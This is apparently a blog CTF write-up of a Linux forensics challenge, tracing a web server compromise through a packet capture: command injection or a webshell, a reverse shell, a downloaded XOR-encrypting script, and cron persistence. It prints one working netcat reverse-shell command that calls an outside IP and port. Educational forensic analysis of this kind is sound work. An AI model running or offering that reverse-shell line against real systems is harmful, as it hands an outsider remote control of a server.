---
layout: post
title: "iTREXC2023: Compromised"
date: 2023-10-22
categories:
  - CTF WriteUp
---

This "Compromised" challenge is one of the forensic challenges in Cyber Security Challenge competition organized by iTREXC (4th International Innovation, Technology & Research Exhibition and Conference). It is in Linux Forensic category and the difficulty is Medium.

For this challenge, we were given a `.pcap` (packet capture) file named `traffic.pcap`. We can open the file with Wireshark. We initially filter for HTTP traffic. We can see that the attacker make a GET request to the web server asking for `/images/date.php`.

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-http-filter.png){:.align-center}

The attacker then exploit a command injection vulnerability through `/images/date.php` (or it may be a webshell used by the attacker to get access to the web server, which means that the attacker already compromised the web server). The reverse shell payload establish a connection to an IP address `159.223.43.45` on port `4443`.

- `rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 159.223.43.45 4443 >/tmp/f`

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-http-post.png){:.align-center}

We can follow the TCP stream of the reverse shell connection :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-follow-tcp-stream.png){:.align-center}

We can see that the compromised server established a connection to `159.223.43.45`, which we believe to be an attacker's remote machine. Following the TCP stream of the reverse shell connection, we can see what's the attacker does in the compromised server.

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-tcp-stream.png){:.align-center}

The attacker navigate to `/home/nbs` and then download a file (`jahak.sh`) from the attacker's remote server to the compromised server. The `jahak.sh` file is a bash script that is used by the attacker to encrypt the document files in the compromised server using XOR encryption and transfer the files to the attacker's remote server.

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-persistent-get.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-jahak-http.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-jahak.png){:.align-center}

The attacker encrypt the `flag.txt` and  `important.txt` file :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-encrypted-file.png){:.align-center}

The attacker create a cronjob on the compromised server to automatically run the malicious script.

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-persistent-path.png){:.align-center}

There is one question in this challenge that ask for hash of the webshell that being access by the attacker :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-export-object.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-export-object-file.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-ls.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/compromised-file-hash.png){:.align-center}
